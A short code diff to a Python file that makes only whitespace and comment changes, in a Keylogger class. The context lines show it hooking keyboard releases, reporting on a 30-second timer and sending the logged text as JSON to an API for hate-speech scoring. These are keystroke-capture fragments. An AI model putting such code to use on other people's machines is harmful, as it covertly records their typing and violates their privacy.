@@ -8,10 +8,9 @@ import json                                 # For API
 import io                                   # For ScreenLogger
 import psutil as ps                         # For process
 import time                                 # For API
-import credenciais as cr
+import credenciais as cr                    # For API
 
 SEND_REPORT_EVERY = 30
-
 
 def isHateSpeech(self):
     dataLogs = json.dumps({"valor": 0, "frase": self.log})
@@ -114,6 +113,7 @@ class Keylogger:
         timer = Timer(interval=self.interval, function=self.report)
         timer.daemon = True
         timer.start()
+
 
     def start(self):
         keyboard.on_release(callback=self.callback)
